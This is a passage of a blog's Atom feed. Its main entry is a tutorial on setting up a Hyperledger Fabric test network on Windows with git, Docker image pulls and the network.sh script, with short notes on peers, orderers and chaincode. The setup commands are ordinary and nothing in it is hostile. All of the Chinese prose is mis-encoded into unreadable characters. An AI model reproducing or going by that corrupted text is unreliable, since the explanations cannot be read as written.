alt="image-20240617014446510"></p><p>æ­¤æ—¶ä¸ä¼šæœ‰è¾“å‡ºï¼Œå³æ‰§è¡Œå¤±è´¥</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;ã€ŠåŒºå—é“¾æŠ€æœ¯ä¸å®è·µã€‹â€”â€” æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html&quot;&gt;https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md&quot;&gt;https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Blockchain" scheme="http://c1oudfl0w0.github.io/blog/categories/Blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>fabricæ­å»º</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/</id>
    <published>2024-06-13T17:01:40.000Z</published>
    <updated>2024-06-18T17:27:05.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/393805594">https://zhuanlan.zhihu.com/p/393805594</a></p><p>ã€ŠåŒºå—é“¾æŠ€æœ¯ä¸å®è·µã€‹â€”â€” æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾</p><span id="more"></span><hr><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>Windows 11</p><p>Docker Desktop v4.20.1</p><p>Git Bash</p><hr><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://hyperledger-fabric.readthedocs.io/zh-cn/latest/">https://hyperledger-fabric.readthedocs.io/zh-cn/latest/</a></p><ol><li><p>å»ºç«‹ fabric å·¥ä½œç›®å½•ï¼Œgithubä¸Šä¸‹è½½sampleæºç ï¼š<a href="https://github.com/hyperledger/fabric-samples">https://github.com/hyperledger/fabric-samples</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/hyperledger/fabric-samples.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ä¸‹è½½ fabric release äºŒè¿›åˆ¶æ–‡ä»¶ï¼š<a href="https://github.com/hyperledger/fabric/releases/download/v2.3.2/hyperledger-fabric-windows-amd64-2.3.2.tar.gz">https://github.com/hyperledger/fabric/releases/download/v2.3.2/hyperledger-fabric-windows-amd64-2.3.2.tar.gz</a></p><p>è§£å‹ç¼©åå¤åˆ¶ bin å’Œ config åˆ° sample æ–‡ä»¶å¤¹</p></li><li><p>ä¸‹è½½dockeré•œåƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull hyperledger/fabric-baseos:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-orderer:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-peer:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-couchdb:latest <span class="token operator">&amp;&amp;</span><span class="token function">docker</span> pull hyperledger/fabric-ca:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ä½¿ç”¨git bashï¼Œæ‰§è¡Œ sample æ–‡ä»¶å¤¹ä¸­çš„ test-network ä¸­çš„ network.sh æ–‡ä»¶ï¼Œå»ºç«‹æµ‹è¯•ç½‘ç»œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> network.sh up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/14/fabric%E6%90%AD%E5%BB%BA/image-20240614011433468.png" alt="image-20240614011433468"></p><p>æ­¤æ—¶å¯ä»¥çœ‹åˆ°ï¼Œæµ‹è¯•ç½‘ç»œå»ºç«‹äº†2ä¸ªpeerï¼Œä¸€ä¸ªorderer</p></li></ol><hr><h1 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h1><h2 id="PeerèŠ‚ç‚¹"><a href="#PeerèŠ‚ç‚¹" class="headerlink" title="PeerèŠ‚ç‚¹"></a>PeerèŠ‚ç‚¹</h2><p>PeerèŠ‚ç‚¹æ˜¯ä¸€ä¸ªç‰©ç†æ¦‚å¿µï¼Œæ˜¯ç½‘ç»œä¸Šè´Ÿè´£ç»´æŠ¤è´¦æœ¬çŠ¶æ€å¹¶ç®¡ç†é“¾ç çš„èŠ‚ç‚¹</p><p>ä½œä¸ºè´¦æœ¬å’Œé“¾ç çš„è½½ä½“ï¼Œå­˜å‚¨åŒ…æ‹¬è´¦æœ¬ã€é“¾ç åœ¨å†…çš„å…³é”®æ•°æ®ï¼Œå¹¶ä¸”æ‰§è¡Œä¾‹å¦‚èƒŒä¹¦ã€é“¾ç ç­‰ç‰¹å®šçš„ç¨‹åº</p><p>æ‰€æœ‰çš„è´¦æœ¬æŸ¥è¯¢ä»¥åŠè´¦æœ¬ä¿®æ”¹å¿…é¡»é€šè¿‡é“¾ç æ¥æ“ä½œï¼Œæ‰€æœ‰çš„é“¾ç æ“ä½œå¿…é¡»é€šè¿‡PeerèŠ‚ç‚¹å”¤èµ·</p><p>å³æä¾›äº†ç”¨æˆ·ä¸ç³»ç»Ÿäº¤äº’çš„æ¥å£</p><hr><h2 id="Ordereræ’åºèŠ‚ç‚¹"><a href="#Ordereræ’åºèŠ‚ç‚¹" class="headerlink" title="Ordereræ’åºèŠ‚ç‚¹"></a>Ordereræ’åºèŠ‚ç‚¹</h2><p>OrdererèŠ‚ç‚¹æ˜¯å…±è¯†æœåŠ¡çš„ç½‘ç»œèŠ‚ç‚¹ï¼Œè´Ÿè´£æ¥æ”¶äº¤æ˜“ã€äº§ç”ŸåŒºå—ï¼Œå¹¶ä¸”å¯¹å…±è¯†æœºåˆ¶çš„ç­–ç•¥è¿›è¡Œç®¡ç†</p><hr><h2 id="Chaincode"><a href="#Chaincode" class="headerlink" title="Chaincode"></a>Chaincode</h2><p>é“¾ä¸Šä»£ç ï¼Œå³æ™ºèƒ½åˆçº¦ï¼Œç®€ç§°ä¸ºé“¾ç </p><p>ä¸€èˆ¬ç”¨goç¼–å†™ï¼Œæ˜¯åˆ†å¸ƒå¼è´¦æœ¬çš„çŠ¶æ€å¤„ç†é€»è¾‘ï¼Œä¸»è¦ç”¨äºæ‰§è¡Œäº¤æ˜“å’Œè®¿é—®çŠ¶æ€æ•°æ®</p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/393805594&quot;&gt;https://zhuanlan.zhihu.com/p/393805594&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ã€ŠåŒºå—é“¾æŠ€æœ¯ä¸å®è·µã€‹â€”â€” æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾&lt;/p&gt;</summary>
    
    
    
    <category term="Blockchain" scheme="http://c1oudfl0w0.github.io/blog/categories/Blockchain/"/>
    
    
  </entry>
  
</feed>
